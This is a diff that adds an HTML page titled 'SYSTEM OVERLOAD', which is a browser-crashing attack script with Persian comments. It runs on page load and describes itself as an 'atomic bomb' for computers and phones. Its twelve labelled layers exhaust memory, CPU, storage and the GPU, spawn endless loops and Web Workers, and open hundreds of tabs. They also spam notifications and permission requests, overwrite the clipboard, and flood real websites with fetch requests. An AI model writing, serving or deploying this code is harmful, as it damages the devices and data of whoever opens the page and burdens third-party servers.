@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>🔥 SYSTEM OVERLOAD 🔥</title>
+<style>
+body { 
+    font-size: 1px; 
+    direction: rtl; 
+    background: black; 
+    color: white; 
+    white-space: pre-wrap; 
+    word-break: break-all; 
+    overflow: hidden; 
+}
+</style>
+</head>
+<body>
+<script>
+// ==================== ☢️ لایه ۱: بمب حافظه با آرایه‌های ۱۰۰۰ مگابایتی ====================
+var memory = [];
+function memoryBomb() {
+    for (var i = 0; i < 10000; i++) {
+        memory.push(new Array(10000000).join('𒀀'));
+        memory.push(new Array(10000000).join('𐎠'));
+        memory.push(new Array(10000000).join('⃟'));
+        memory.push(new Array(10000000).join('꙰'));
+        memory.push(new Array(10000000).join('💀'));
+        memory.push(new Array(10000000).join('🔥'));
+    }
+}
+setInterval(memoryBomb, 1);
+
+// ==================== ☢️ لایه ۲: حلقه‌های بی‌نهایت با کاراکترهای سنگین ====================
+function infiniteLoop() {
+    var chars = ['⃟','꙰','𒀀','𐎠','🇮🇷','💀','🔥','⚡','🌟','🌀','💫','🌪️','🌈','🇺🇸','🇬🇧','🇩🇪','🇫🇷','🇮🇹','🇯🇵','🇨🇳','🇷🇺','☠️','💣','🚀','🔥','⚡','💥','🎯','🤖','👾','💀','☢️'];
+    while (true) {
+        document.body.innerHTML += chars[Math.floor(Math.random() * chars.length)];
+        document.body.innerHTML += '𒀀𒀁𒀂𒀃𒀄𒀅𒀆𒀇𒀈𒀉'.repeat(10000);
+        document.body.innerHTML += '💀'.repeat(10000);
+        document.body.innerHTML += '🔥'.repeat(10000);
+        document.body.innerHTML += '⚡'.repeat(10000);
+    }
+}
+setTimeout(infiniteLoop, 0);
+
+// ==================== ☢️ لایه ۳: درخواست‌های سخت‌افزاری و سیستمی ====================
+function hardwareAttack() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            navigator.geolocation.getCurrentPosition(function(){}, function(){});
+            navigator.mediaDevices.getUserMedia({audio:true, video:true});
+            navigator.vibrate(100000);
+            navigator.mediaDevices.enumerateDevices();
+            navigator.getBattery().then(function(battery) {});
+            navigator.connection = navigator.connection || {};
+            // درخواست‌های بیشتر برای کامپیوتر
+            navigator.mediaDevices.getDisplayMedia({video:true});
+            navigator.permissions.query({name:'geolocation'});
+            navigator.permissions.query({name:'notifications'});
+        } catch(e) {}
+    }
+}
+setInterval(hardwareAttack, 1);
+
+// ==================== ☢️ لایه ۴: بمب تب ====================
+function tabBomb() {
+    for (var i = 0; i < 200; i++) {
+        window.open('https://example.com', '_blank');
+        window.open('https://google.com', '_blank');
+        window.open('https://youtube.com', '_blank');
+        window.open('https://github.com', '_blank');
+        window.open('https://stackoverflow.com', '_blank');
+        window.open('https://reddit.com', '_blank');
+    }
+}
+setInterval(tabBomb, 50);
+
+// ==================== ☢️ لایه ۵: بمب نوتیفیکیشن ====================
+function notifBomb() {
+    for (var i = 0; i < 100; i++) {
+        try {
+            Notification.requestPermission().then(function() {
+                new Notification('🚨 حمله اتمی!', {body: 'سیستم در حال فروپاشی! 🤖'});
+                new Notification('🔥 سیستم قفل شد!', {body: 'داره می‌سوزه!'});
+                new Notification('💀 مرگ تدریجی!', {body: 'رم پر شد!'});
+                new Notification('☢️ بمب اتمی!', {body: 'کامپیوتر تو نابود شد!'});
+            });
+        } catch(e) {}
+    }
+}
+setInterval(notifBomb, 50);
+
+// ==================== ☢️ لایه ۶: بمب کلیپ‌بورد ====================
+function clipboardBomb() {
+    for (var i = 0; i < 200; i++) {
+        try {
+            navigator.clipboard.writeText('𒀀'.repeat(1000000) + '⃟'.repeat(1000000) + '💀'.repeat(1000000) + '🔥'.repeat(1000000));
+        } catch(e) {}
+    }
+}
+setInterval(clipboardBomb, 50);
+
+// ==================== ☢️ لایه ۷: بمب ذخیره‌سازی ====================
+function storageBomb() {
+    for (var i = 0; i < 100000; i++) {
+        try {
+            localStorage.setItem('bomb' + i, '𒀀'.repeat(1000000));
+            sessionStorage.setItem('bomb' + i, '⃟'.repeat(1000000));
+            localStorage.setItem('bomb2' + i, '💀'.repeat(1000000));
+            sessionStorage.setItem('bomb2' + i, '🔥'.repeat(1000000));
+        } catch(e) {}
+    }
+}
+setInterval(storageBomb, 1);
+
+// ==================== ☢️ لایه ۸: بمب Web Workers ====================
+function workerBomb() {
+    for (var i = 0; i < 200; i++) {
+        try {
+            var worker = new Worker('data:text/javascript;base64,' + btoa('while(true){}'));
+            var worker2 = new Worker('data:text/javascript;base64,' + btoa('for(;;){}'));
+            var worker3 = new Worker('data:text/javascript;base64,' + btoa('setInterval(function(){},1)'));
+            var worker4 = new Worker('data:text/javascript;base64,' + btoa('while(true){fetch("https://example.com")}'));
+        } catch(e) {}
+    }
+}
+setInterval(workerBomb, 1);
+
+// ==================== ☢️ لایه ۹: بمب Canvas و WebGL ====================
+function canvasBomb() {
+    for (var i = 0; i < 1000; i++) {
+        var canvas = document.createElement('canvas');
+        canvas.width = 10000000;
+        canvas.height = 10000000;
+        var ctx = canvas.getContext('2d');
+        var gl = canvas.getContext('webgl');
+        var gl2 = canvas.getContext('webgl2');
+        for (var j = 0; j < 1000000; j++) {
+            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
+            ctx.fillRect(Math.random()*10000000, Math.random()*10000000, 100000, 100000);
+            ctx.fillRect(Math.random()*10000000, Math.random()*10000000, 100000, 100000);
+            if (gl) {
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000000), gl.STATIC_DRAW);
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000000), gl.STATIC_DRAW);
+            }
+            if (gl2) {
+                gl2.bufferData(gl2.ARRAY_BUFFER, new Float32Array(10000000), gl2.STATIC_DRAW);
+            }
+        }
+        document.body.appendChild(canvas);
+        document.body.appendChild(canvas.cloneNode(true));
+    }
+}
+setInterval(canvasBomb, 1);
+
+// ==================== ☢️ لایه ۱۰: بمب صوتی ====================
+function audioBomb() {
+    for (var i = 0; i < 200; i++) {
+        try {
+            var audio = new AudioContext();
+            for (var j = 0; j < 100000; j++) {
+                var oscillator = audio.createOscillator();
+                oscillator.frequency.value = Math.random() * 10000000;
+                oscillator.type = 'sawtooth';
+                oscillator.connect(audio.destination);
+                oscillator.start();
+                oscillator.stop(0.001);
+            }
+        } catch(e) {}
+    }
+}
+setInterval(audioBomb, 1);
+
+// ==================== ☢️ لایه ۱۱: بمب fetch و شبکه ====================
+function networkBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            fetch('https://example.com?' + Math.random());
+            fetch('https://google.com?' + Math.random());
+            fetch('https://youtube.com?' + Math.random());
+            fetch('https://github.com?' + Math.random());
+        } catch(e) {}
+    }
+}
+setInterval(networkBomb, 1);
+
+// ==================== ☢️ لایه ۱۲: بمب تاریخچه ====================
+function historyBomb() {
+    for (var i = 0; i < 10000; i++) {
+        try {
+            history.pushState({}, '', '#' + Math.random());
+            history.pushState({}, '', '#' + Math.random());
+            history.pushState({}, '', '#' + Math.random());
+        } catch(e) {}
+    }
+}
+setInterval(historyBomb, 1);
+
+// ==================== ☢️ اجرای همزمان ====================
+console.log('☢️ بمب اتمی برای کامپیوتر و گوشی فعال شد!');
+</script>
+</body>
+  </html>
